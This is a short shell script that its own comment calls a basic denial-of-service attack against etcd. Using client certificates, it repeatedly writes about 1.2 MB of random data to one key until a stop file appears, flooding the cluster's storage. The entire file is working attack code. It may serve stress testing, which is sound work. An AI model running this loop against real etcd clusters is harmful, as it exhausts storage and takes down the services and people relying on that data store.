#!/bin/sh
# Very basic DoS attack against etcd
readonly cpath=$1
readonly url=$2

if [[ "$3" == "random" ]]; then
  readonly key=$RANDOM
else
  readonly key=$3
fi

while [ ! -f /tmp/stop ]; do
  # about the largest data size we can insert at once
  dd if=/dev/urandom bs=1024 count=1200 2>/dev/null \
    | ETCDCTL_API=3 etcdctl \
      --cacert ${cpath}.ca \
      --cert ${cpath}.crt \
      --key ${cpath}.key \
      --endpoints "${url}" put "${key}"
done

echo "end ${key}"